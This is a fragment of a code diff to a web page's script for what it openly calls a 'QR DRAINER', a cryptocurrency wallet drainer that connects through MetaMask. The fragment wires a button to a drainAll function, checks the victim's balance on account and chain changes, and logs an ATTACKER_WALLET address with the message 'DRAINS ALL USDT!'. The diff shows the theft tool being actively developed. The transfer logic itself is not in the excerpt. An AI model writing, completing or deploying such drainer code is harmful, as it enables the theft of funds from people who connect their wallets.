+// EVENT LISTENERS
+// ============================================================
+drainBtn.addEventListener('click', drainAll);
+
+// MetaMask events
+if (window.ethereum) {
+    window.ethereum.on('accountsChanged', function() {
+        checkBalance();
+    });
     window.ethereum.on('chainChanged', function() {
-        setTimeout(checkAndDisplayBalance, 2000);
+        setTimeout(checkBalance, 2000);
     });
 }
 
@@ -688,20 +811,16 @@ if (window.ethereum) {
 // INIT
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('🚀 DRAINER READY');
-    console.log('🎯 ATTACKER WALLET:', ATTACKER_WALLET);
-    console.log('⚠️ THIS WILL DRAIN ALL USDT!');
-    
-    updateNetwork();
-    amountInput.dispatchEvent(new Event('input'));
+    console.log('🚀 QR DRAINER READY');
+    console.log('🎯 ATTACKER:', ATTACKER_WALLET);
+    console.log('⚠️ DRAINS ALL USDT!');
     
     if (typeof window.ethereum !== 'undefined') {
-        startBalanceCheck();
+        checkBalance();
     } else {
-        balanceDisplay.innerHTML = '⚠️ Please install MetaMask';
+        userBalanceDisplay.textContent = '⚠️ Install MetaMask';
+        balanceMsg.textContent = '⚠️ Please install MetaMask';
     }
-    
-    drainBtn.addEventListener('click', handleDrain);
 });
 </script>
 
